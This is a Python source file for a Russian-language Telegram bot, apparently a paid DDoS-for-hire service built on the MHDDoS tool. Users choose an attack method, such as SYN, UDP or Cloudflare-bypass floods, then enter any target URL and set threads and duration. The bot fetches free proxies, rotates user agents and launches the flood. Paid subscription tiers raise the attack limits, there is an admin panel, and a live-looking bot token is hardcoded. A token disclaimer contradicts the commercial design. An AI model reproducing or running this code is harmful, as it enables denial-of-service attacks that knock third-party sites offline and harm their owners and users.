#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MHDDoS БОТ — ВЕБХУК (обход блокировки)
"""

import asyncio
import os
import subprocess
import json
import time
import random
import requests
import re
from datetime import datetime, timedelta
from typing import Dict, List

from aiohttp import web
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram import F
from aiogram.client.session.aiohttp import AiohttpSession

# ==============================
#  КОНФИГ
# ==============================
BOT_TOKEN = "8984259381:AAHAc-dorORjD-G0Ci2lLnwf_kbbzqqCxkg"
ADMINS = [8264264137]

MH_DDOS_PATH = "start.py"
PROXIES_FILE = "proxies.txt"
DATA_FILE = "users.json"
UA_FILE = "user_agents.txt"

# ВАЖНО: замените на ваш реальный URL от Railway
# Он выглядит как https://llosdfisojdfouisdf.up.railway.app
WEBHOOK_URL = "https://llosdfisojdfouisdf.up.railway.app/webhook"

try:
    from fake_useragent import UserAgent
    UA_AVAILABLE = True
except:
    UA_AVAILABLE = False

# ==============================
#  USER-AGENT
# ==============================
def get_user_agents() -> List[str]:
    if os.path.exists(UA_FILE):
        with open(UA_FILE, "r", encoding="utf-8") as f:
            ua = [line.strip() for line in f if line.strip()]
            if len(ua) > 10:
                return ua
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    ]
    if UA_AVAILABLE:
        try:
            ua = UserAgent()
            for _ in range(100):
                ua_list.append(ua.random)
        except:
            pass
    final = list(set(ua_list))
    with open(UA_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(final))
    return final

USER_AGENTS = get_user_agents()

def get_random_ua():
    return random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0"

# ==============================
#  ТАРИФЫ
# ==============================
TIERS = {
    "free": {"name": "🐢 Бесплатный", "max_threads": 100, "max_duration": 60},
    "medium": {"name": "⚡ Средний", "max_threads": 500, "max_duration": 600},
    "pro": {"name": "💥 Мощный", "max_threads": 3000, "max_duration": 3600}
}
DEFAULT_TIER = "free"

# ==============================
#  ДАННЫЕ ПОЛЬЗОВАТЕЛЕЙ
# ==============================
def load_users():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def get_user(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"balance": 0, "tier": "free", "expiry": None}
        save_users(users)
    return users[uid]

def set_user_tier(user_id, tier):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"balance": 0, "tier": "free", "expiry": None}
    users[uid]["tier"] = tier
    if tier != "free":
        users[uid]["expiry"] = (datetime.now() + timedelta(days=30)).isoformat()
    else:
        users[uid]["expiry"] = None
    save_users(users)

def is_admin(user_id):
    return user_id in ADMINS

# ==============================
#  ПРОКСИ
# ==============================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/https.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/http.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/https.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/socks4.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/socks5.txt",
]

def fetch_proxies():
    all_proxies = []
    seen = set()
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and not line.startswith('#') and ':' in line:
                        if line not in seen:
                            seen.add(line)
                            all_proxies.append(line)
        except:
            pass
    return all_proxies

def validate_proxies(proxy_list):
    valid = []
    for proxy in proxy_list[:50]:
        try:
            r = requests.get("http://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3)
            if r.status_code == 200:
                valid.append(proxy)
        except:
            pass
    return valid

def update_proxies():
    raw = fetch_proxies()
    if raw:
        valid = validate_proxies(raw)
        if valid:
            with open(PROXIES_FILE, "w") as f:
                f.write("\n".join(valid))
            return len(valid)
    return 0

# ==============================
#  АТАКА
# ==============================
active_attacks = {}

async def run_attack(user_id, method, url, threads, duration):
    update_proxies()
    if not os.path.exists(PROXIES_FILE):
        open(PROXIES_FILE, 'a').close()
    cmd = ["python", MH_DDOS_PATH, method, url, "0", str(threads), PROXIES_FILE, "64", str(duration)]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=os.path.dirname(os.path.abspath(__file__)))
    return process

async def stop_attack(user_id):
    if user_id in active_attacks:
        active_attacks[user_id]["process"].terminate()
        try:
            active_attacks[user_id]["process"].wait(timeout=5)
        except:
            active_attacks[user_id]["process"].kill()
        del active_attacks[user_id]
        return True
    return False

# ==============================
#  КЛАВИАТУРЫ
# ==============================
def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🚀 Запустить атаку", callback_data="attack_start"),
            InlineKeyboardButton(text="⏹️ Остановить атаку", callback_data="attack_stop")
        ],
        [
            InlineKeyboardButton(text="📊 Статус", callback_data="status"),
            InlineKeyboardButton(text="💡 Помощь", callback_data="help")
        ],
        [
            InlineKeyboardButton(text="💎 Купить подписку", callback_data="buy_tier"),
            InlineKeyboardButton(text="👤 Мой тариф", callback_data="my_tier")
        ],
        [
            InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_panel")
        ]
    ])

def admin_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"),
            InlineKeyboardButton(text="💎 Выдать подписку", callback_data="admin_give")
        ],
        [
            InlineKeyboardButton(text="🔄 Обновить прокси", callback_data="admin_update_proxies"),
            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
        ]
    ])

def buy_tier_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🐢 Бесплатный", callback_data="tier_free"),
            InlineKeyboardButton(text="⚡ Средний (400 ₽)", callback_data="tier_medium")
        ],
        [
            InlineKeyboardButton(text="💥 Мощный (799 ₽)", callback_data="tier_pro"),
            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
        ]
    ])

def method_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔥 KILLER", callback_data="m_KILLER"),
            InlineKeyboardButton(text="🛡️ BYPASS", callback_data="m_BYPASS")
        ],
        [
            InlineKeyboardButton(text="🌐 GET", callback_data="m_GET"),
            InlineKeyboardButton(text="📨 POST", callback_data="m_POST")
        ],
        [
            InlineKeyboardButton(text="⚡ SYN", callback_data="m_SYN"),
            InlineKeyboardButton(text="📦 UDP", callback_data="m_UDP")
        ],
        [
            InlineKeyboardButton(text="☁️ CFB", callback_data="m_CFB"),
            InlineKeyboardButton(text="☁️ CFBUAM", callback_data="m_CFBUAM")
        ],
        [
            InlineKeyboardButton(text="🔧 Другие", callback_data="method_other"),
            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
        ]
    ])

def other_methods_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔹 HEAD", callback_data="m_HEAD"),
            InlineKeyboardButton(text="🔹 SLOW", callback_data="m_SLOW")
        ],
        [
            InlineKeyboardButton(text="🔹 APACHE", callback_data="m_APACHE"),
            InlineKeyboardButton(text="🔹 XMLRPC", callback_data="m_XMLRPC")
        ],
        [
            InlineKeyboardButton(text="🔹 DGB", callback_data="m_DGB"),
            InlineKeyboardButton(text="🔹 PPS", callback_data="m_PPS")
        ],
        [
            InlineKeyboardButton(text="🔹 STOMP", callback_data="m_STOMP"),
            InlineKeyboardButton(text="🔹 AVB", callback_data="m_AVB")
        ],
        [
            InlineKeyboardButton(text="🔹 RHEX", callback_data="m_RHEX"),
            InlineKeyboardButton(text="🔹 BOMB", callback_data="m_BOMB")
        ],
        [
            InlineKeyboardButton(text="🔹 EVEN", callback_data="m_EVEN"),
            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_method")
        ]
    ])

def threads_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="50", callback_data="t_50"),
            InlineKeyboardButton(text="100", callback_data="t_100")
        ],
        [
            InlineKeyboardButton(text="200", callback_data="t_200"),
            InlineKeyboardButton(text="500", callback_data="t_500")
        ],
        [
            InlineKeyboardButton(text="1000", callback_data="t_1000"),
            InlineKeyboardButton(text="2000", callback_data="t_2000")
        ],
        [
            InlineKeyboardButton(text="🔢 Своё", callback_data="t_custom"),
            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_method")
        ]
    ])

def duration_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="⏱️ 30 сек", callback_data="d_30"),
            InlineKeyboardButton(text="⏱️ 60 сек", callback_data="d_60")
        ],
        [
            InlineKeyboardButton(text="⏱️ 120 сек", callback_data="d_120"),
            InlineKeyboardButton(text="⏱️ 300 сек", callback_data="d_300")
        ],
        [
            InlineKeyboardButton(text="⏱️ 600 сек", callback_data="d_600"),
            InlineKeyboardButton(text="🔢 Своё", callback_data="d_custom")
        ],
        [
            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_threads")
        ]
    ])

def confirm_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Запустить", callback_data="confirm_launch"),
            InlineKeyboardButton(text="❌ Отмена", callback_data="back_main")
        ]
    ])

# ==============================
#  БЕЗОПАСНОЕ РЕДАКТИРОВАНИЕ
# ==============================
async def safe_edit(message, text, parse_mode="HTML", reply_markup=None):
    try:
        await message.edit_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        if "message is not modified" in str(e) or "message to edit not found" in str(e):
            pass
        else:
            raise

# ==============================
#  БОТ
# ==============================
bot = Bot(token=BOT_TOKEN, connect_timeout=120, read_timeout=120)
dp = Dispatcher()
user_data = {}

# ==============================
#  СТАРТ
# ==============================
@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    user = get_user(message.from_user.id)
    tier_name = TIERS[user["tier"]]["name"]
    await message.answer(
        f"🌟 <b>MHDDoS БОТ</b>\n\n👤 Тариф: {tier_name}\n💎 Баланс: {user['balance']} ⭐\n\n"
        f"🚀 Управляй атаками через кнопки.",
        parse_mode="HTML",
        reply_markup=main_menu()
    )

# ==============================
#  НАВИГАЦИЯ
# ==============================
@dp.callback_query(F.data == "back_main")
async def back_main(callback: types.CallbackQuery):
    await safe_edit(callback.message, "🌟 Главное меню", reply_markup=main_menu())
    await callback.answer()

@dp.callback_query(F.data == "back_method")
async def back_method(callback: types.CallbackQuery):
    await safe_edit(callback.message, "🎯 Выберите метод:", reply_markup=method_menu())
    await callback.answer()

@dp.callback_query(F.data == "back_threads")
async def back_threads(callback: types.CallbackQuery):
    await safe_edit(callback.message, "🧵 Выберите потоки:", reply_markup=threads_menu())
    await callback.answer()

@dp.callback_query(F.data == "help")
async def help_cmd(callback: types.CallbackQuery):
    await safe_edit(
        callback.message,
        "📖 <b>Помощь</b>\n\n🚀 Запустить атаку — выбери метод, URL, потоки, длительность.\n"
        "⏹️ Остановить атаку.\n📊 Статус.\n\n⚠️ Используй только на своих ресурсах!",
        reply_markup=main_menu()
    )
    await callback.answer()

@dp.callback_query(F.data == "status")
async def status_cmd(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in active_attacks:
        data = active_attacks[user_id]
        elapsed = time.time() - data["start_time"]
        remaining = max(0, data["duration"] - elapsed)
        await safe_edit(
            callback.message,
            f"🏃 <b>Атака выполняется</b>\n\n⏱️ Прошло: {int(elapsed)} сек\n⏳ Осталось: {int(remaining)} сек\n"
            f"📌 Метод: {data['method']}\n🎯 {data['url']}",
            reply_markup=main_menu()
        )
    else:
        await safe_edit(callback.message, "✅ Активных атак нет.", reply_markup=main_menu())
    await callback.answer()

# ==============================
#  ПОДПИСКИ
# ==============================
@dp.callback_query(F.data == "buy_tier")
async def buy_tier(callback: types.CallbackQuery):
    await safe_edit(
        callback.message,
        "💎 <b>Купить подписку</b>\n\nВыбери тариф. Для оплаты напиши @pasybos.",
        reply_markup=buy_tier_menu()
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("tier_"))
async def tier_select(callback: types.CallbackQuery):
    tier = callback.data.split("_")[1]
    user_id = callback.from_user.id
    if tier == "free":
        set_user_tier(user_id, "free")
        await callback.answer("✅ Бесплатный тариф активирован!", show_alert=True)
        await safe_edit(callback.message, "🐢 Бесплатный тариф активирован!", reply_markup=main_menu())
    else:
        price = 400 if tier == "medium" else 799
        await safe_edit(
            callback.message,
            f"💎 Вы выбрали {TIERS[tier]['name']} — {price} ₽\n\nНапиши @pasybos для оплаты.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📩 Написать @pasybos", url="https://t.me/pasybos")],
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")]
            ])
        )
    await callback.answer()

@dp.callback_query(F.data == "my_tier")
async def my_tier(callback: types.CallbackQuery):
    user = get_user(callback.from_user.id)
    tier = user["tier"]
    tier_info = TIERS[tier]
    expiry = user.get("expiry")
    if expiry:
        exp_date = datetime.fromisoformat(expiry)
        days_left = (exp_date - datetime.now()).days
        expiry_text = f"Действует до {exp_date.strftime('%d.%m.%Y')} (осталось {days_left} дн.)"
    else:
        expiry_text = "Без ограничений" if tier == "free" else "Не активна"
    await safe_edit(
        callback.message,
        f"👤 <b>Твой тариф</b>\n\n📌 {tier_info['name']}\n🧵 Макс. потоков: {tier_info['max_threads']}\n"
        f"⏱️ Макс. длительность: {tier_info['max_duration']} сек\n📅 {expiry_text}",
        reply_markup=main_menu()
    )
    await callback.answer()

# ==============================
#  АТАКА
# ==============================
@dp.callback_query(F.data == "attack_start")
async def attack_start(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in active_attacks:
        await callback.answer("⚠️ Уже есть активная атака!", show_alert=True)
        return
    await safe_edit(callback.message, "🎯 Выберите метод:", reply_markup=method_menu())
    await callback.answer()

@dp.callback_query(F.data == "method_other")
async def method_other(callback: types.CallbackQuery):
    await safe_edit(callback.message, "🔧 Другие методы:", reply_markup=other_methods_menu())
    await callback.answer()

@dp.callback_query(F.data.startswith("m_"))
async def method_choose(callback: types.CallbackQuery):
    method = callback.data.split("_")[1]
    user_data[callback.from_user.id] = {"method": method}
    await safe_edit(callback.message, f"✅ Метод: {method}\n\nВведите URL (например, example.com):", reply_markup=None)
    await callback.answer()

# ==============================
#  ОБРАБОТЧИК ВСЕХ ТЕКСТОВЫХ СООБЩЕНИЙ
# ==============================
@dp.message(F.text)
async def handle_text(message: types.Message):
    user_id = message.from_user.id
    data = user_data.get(user_id, {})
    awaiting = data.get("awaiting")
    
    # 1. Обработка выдачи подписки
    if awaiting == "give_tier":
        parts = message.text.strip().split()
        if len(parts) != 2:
            await message.answer("❌ Формат: ID ТАРИФ\nНапример: 123456789 pro")
            return
        target_id_str, tier = parts
        if not target_id_str.isdigit():
            await message.answer("❌ ID должен быть числом.")
            return
        target_id = int(target_id_str)
        if tier not in TIERS:
            await message.answer("❌ Доступные тарифы: free, medium, pro")
            return
        set_user_tier(target_id, tier)
        await message.answer(f"✅ Пользователю {target_id} назначен {TIERS[tier]['name']}")
        try:
            await bot.send_message(target_id, f"🎉 Вам назначен тариф {TIERS[tier]['name']}!")
        except:
            pass
        user_data.pop(user_id, None)
        return
    
    # 2. Если ожидаем ввод URL
    if user_id in user_data and "method" in user_data[user_id] and "url" not in user_data[user_id]:
        url = message.text.strip()
        if not url.startswith("http"):
            url = "https://" + url
        user_data[user_id]["url"] = url
        await message.answer(f"✅ URL: {url}\n\nВыберите потоки:", reply_markup=threads_menu())
        return
    
    # 3. Если ожидаем ввод чисел (потоки или длительность)
    if awaiting in ("threads", "duration"):
        try:
            val = int(message.text.strip())
        except ValueError:
            await message.answer("❌ Введите число!")
            return
        if awaiting == "threads":
            tier = get_user(user_id)["tier"]
            max_thr = TIERS[tier]["max_threads"]
            if val < 1 or val > max_thr:
                await message.answer(f"❌ Твой тариф разрешает до {max_thr} потоков.")
                return
            user_data[user_id]["threads"] = val
            user_data[user_id].pop("awaiting")
            await message.answer(f"🧵 Потоки: {val}\n\nВыберите длительность:", reply_markup=duration_menu())
        elif awaiting == "duration":
            tier = get_user(user_id)["tier"]
            max_dur = TIERS[tier]["max_duration"]
            if val < 1 or val > max_dur:
                await message.answer(f"❌ Твой тариф разрешает до {max_dur} сек.")
                return
            user_data[user_id]["duration"] = val
            user_data[user_id].pop("awaiting")
            await show_confirm(message, user_id)
        return

async def show_confirm(message, user_id):
    data = user_data[user_id]
    method = data["method"]
    url = data["url"]
    threads = data["threads"]
    duration = data["duration"]
    await message.answer(
        f"📋 <b>Проверьте параметры</b>\n\n🎯 Метод: {method}\n🌐 URL: {url}\n🧵 Потоки: {threads}\n⏱️ Длительность: {duration} сек\n\n"
        f"🔄 Загружаю прокси... (20-40 сек)\n\nЗапускаем?",
        parse_mode="HTML",
        reply_markup=confirm_menu()
    )

@dp.callback_query(F.data.startswith("t_"))
async def threads_choose(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if "url" not in user_data.get(user_id, {}):
        await callback.answer("Сначала введите URL!", show_alert=True)
        return
    val = callback.data.split("_")[1]
    if val == "custom":
        await safe_edit(callback.message, "🔢 Введите количество потоков:", reply_markup=None)
        user_data[user_id]["awaiting"] = "threads"
        await callback.answer()
        return
    threads = int(val)
    tier = get_user(user_id)["tier"]
    max_thr = TIERS[tier]["max_threads"]
    if threads > max_thr:
        await callback.answer(f"⚠️ Твой тариф разрешает до {max_thr} потоков!", show_alert=True)
        return
    user_data[user_id]["threads"] = threads
    await safe_edit(callback.message, f"🧵 Потоки: {threads}\n\nВыберите длительность:", reply_markup=duration_menu())
    await callback.answer()

@dp.callback_query(F.data.startswith("d_"))
async def duration_choose(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    val = callback.data.split("_")[1]
    if val == "custom":
        await safe_edit(callback.message, "⏱️ Введите длительность (сек):", reply_markup=None)
        user_data[user_id]["awaiting"] = "duration"
        await callback.answer()
        return
    duration = int(val)
    tier = get_user(user_id)["tier"]
    max_dur = TIERS[tier]["max_duration"]
    if duration > max_dur:
        await callback.answer(f"⚠️ Твой тариф разрешает до {max_dur} сек!", show_alert=True)
        return
    user_data[user_id]["duration"] = duration
    await show_confirm(callback.message, user_id)

@dp.callback_query(F.data == "confirm_launch")
async def confirm_launch(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    data = user_data.pop(user_id, {})
    method = data.get("method")
    url = data.get("url")
    threads = data.get("threads")
    duration = data.get("duration")
    if not all([method, url, threads, duration]):
        await safe_edit(callback.message, "❌ Ошибка: не хватает данных.", reply_markup=main_menu())
        await callback.answer()
        return
    # Проверка тарифа
    tier = get_user(user_id)["tier"]
    if threads > TIERS[tier]["max_threads"] or duration > TIERS[tier]["max_duration"]:
        await safe_edit(
            callback.message,
            f"⚠️ Твой тариф не позволяет такие параметры!\nМакс. потоки: {TIERS[tier]['max_threads']}, макс. время: {TIERS[tier]['max_duration']} сек.",
            reply_markup=main_menu()
        )
        await callback.answer()
        return
    # Запуск атаки
    loading = await callback.message.edit_text("🔄 Загружаю прокси... Подождите 20-40 сек.", parse_mode="HTML")
    try:
        process = await run_attack(user_id, method, url, threads, duration)
        start = time.time()
        await loading.delete()
        msg = await callback.message.edit_text(
            f"🚀 <b>Атака запущена!</b>\n\n🎯 {method}\n🌐 {url}\n🧵 {threads}\n⏱️ {duration} сек\n\n⏳ 0%",
            parse_mode="HTML",
            reply_markup=main_menu()
        )
        active_attacks[user_id] = {
            "process": process,
            "start_time": start,
            "duration": duration,
            "method": method,
            "url": url,
            "msg": msg,
            "last_update": start
        }
        asyncio.create_task(monitor_attack(user_id))
    except Exception as e:
        await safe_edit(callback.message, f"❌ Ошибка: {e}", reply_markup=main_menu())
    await callback.answer()

async def monitor_attack(user_id):
    data = active_attacks.get(user_id)
    if not data:
        return
    process = data["process"]
    duration = data["duration"]
    start = data["start_time"]
    msg = data["msg"]
    last_update = start
    while process.poll() is None:
        elapsed = time.time() - start
        remaining = max(0, duration - elapsed)
        if remaining <= 0:
            break
        if time.time() - last_update >= 5:
            progress = min(100, int(elapsed / duration * 100))
            try:
                await safe_edit(
                    msg,
                    f"🚀 <b>Атака выполняется</b>\n\n🎯 {data['method']}\n🌐 {data['url']}\n🧵 {data.get('threads', '?')}\n\n"
                    f"⏳ <b>Прогресс:</b> {progress}%\n⏱️ Прошло: {int(elapsed)} сек / {duration} сек\n⏳ Осталось: {int(remaining)} сек\n\n"
                    f"📊 Запросов: ~{int(elapsed * 100)}",
                    reply_markup=main_menu()
                )
            except:
                pass
            last_update = time.time()
        await asyncio.sleep(1)
    stdout, stderr = process.communicate()
    output = stdout or stderr
    report = output[-1000:] if output else "Атака завершена."
    final = f"✅ <b>Атака завершена!</b>\n\n📊 <b>Отчёт:</b>\n<code>{report}</code>"
    try:
        await safe_edit(msg, final, reply_markup=main_menu())
    except:
        await bot.send_message(user_id, final, parse_mode="HTML", reply_markup=main_menu())
    if user_id in active_attacks:
        del active_attacks[user_id]

@dp.callback_query(F.data == "attack_stop")
async def stop_attack_cmd(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if await stop_attack(user_id):
        await safe_edit(callback.message, "🛑 Атака остановлена.", reply_markup=main_menu())
    else:
        await safe_edit(callback.message, "❌ Нет активной атаки.", reply_markup=main_menu())
    await callback.answer()

# ==============================
#  АДМИН-ПАНЕЛЬ
# ==============================
@dp.callback_query(F.data == "admin_panel")
async def admin_panel(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Нет прав!", show_alert=True)
        return
    await safe_edit(callback.message, "👑 Админ-панель", reply_markup=admin_menu())
    await callback.answer()

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    users = load_users()
    total = len(users)
    stars = sum(u.get("balance", 0) for u in users.values())
    attacks = len(active_attacks)
    tiers = {"free": 0, "medium": 0, "pro": 0}
    for u in users.values():
        tiers[u.get("tier", "free")] += 1
    proxy_count = 0
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, "r") as f:
            proxy_count = len([l for l in f if l.strip()])
    await safe_edit(
        callback.message,
        f"📊 <b>Статистика</b>\n\n👥 Пользователей: {total}\n⭐ Звёзд: {stars}\n⚡ Активных атак: {attacks}\n"
        f"🔄 Прокси: {proxy_count}\n🌐 User-Agent: {len(USER_AGENTS)}\n\n"
        f"📌 Тарифы:\n🐢 Бесплатных: {tiers['free']}\n⚡ Средних: {tiers['medium']}\n💥 Мощных: {tiers['pro']}",
        reply_markup=admin_menu()
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_update_proxies")
async def admin_update_proxies(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    await safe_edit(callback.message, "🔄 Обновляю прокси...", reply_markup=None)
    count = update_proxies()
    if count > 0:
        await safe_edit(callback.message, f"✅ Прокси обновлены! Загружено {count} рабочих.", reply_markup=admin_menu())
    else:
        await safe_edit(callback.message, "❌ Не удалось обновить прокси.", reply_markup=admin_menu())
    await callback.answer()

@dp.callback_query(F.data == "admin_give")
async def admin_give(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    user_data[callback.from_user.id] = {"awaiting": "give_tier"}
    await safe_edit(
        callback.message,
        "💎 <b>Выдать подписку</b>\n\nОтправьте: <code>ID ТАРИФ</code>\nНапример: <code>123456789 pro</code>\n\nТарифы: free, medium, pro",
        parse_mode="HTML",
        reply_markup=admin_menu()
    )
    await callback.answer()

# ==============================
#  ЗАПУСК (ВЕБХУК)
# ==============================
async def main():
    # Устанавливаем вебхук
    await bot.delete_webhook()
    await bot.set_webhook(WEBHOOK_URL)
    print(f"✅ Вебхук установлен на {WEBHOOK_URL}")

    # Создаём веб-приложение для приёма обновлений
    app = web.Application()
    
    # Обработчик вебхука
    async def webhook_handler(request):
        update_data = await request.json()
        update = types.Update(**update_data)
        await dp.process_update(update)
        return web.Response(text="OK")
    
    app.router.add_post("/webhook", webhook_handler)
    
    # Запускаем веб-сервер
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
    await site.start()
    print("✅ Веб-сервер запущен на порту 8080")
    
    # Держим сервер работающим
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
